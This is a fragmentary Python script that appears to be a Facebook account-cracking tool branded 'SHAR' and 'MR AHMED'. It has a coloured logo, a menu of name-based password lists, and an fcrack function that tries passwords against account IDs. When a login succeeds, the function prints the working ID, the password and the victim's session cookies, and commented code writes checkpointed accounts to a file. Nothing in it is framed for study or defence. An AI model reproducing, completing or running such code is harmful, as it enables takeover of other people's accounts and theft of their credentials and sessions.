...
os.system("xdg-open https://facebook.com/groups/1045863943094685/")
import uuid
...
logo = """
\033[1;31m   _____ _    _          _____  
 \033[1;32m / ____| |  | |   /\   |  __ \ 
\033[1;33m | (___ | |__| |  /  \  | |__) |
\033[1;34m  \___ \|  __  | / /\ \ |  _  / 
\033[1;35m  ____) | |  | |/ ____ \| | \ \ 
 \033[1;36m|_____/|_|  |_/_/    \_\_|  \_\ \033[1;37m (SHAR)💔
...
def menu():
	...
	print('[2] AHMED + KHAN PASS')
	print('[3]  SHAR + BALOCH PASS')
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR_AHMED-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[MR AHMED-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('MR AHMED-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR AHMED\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
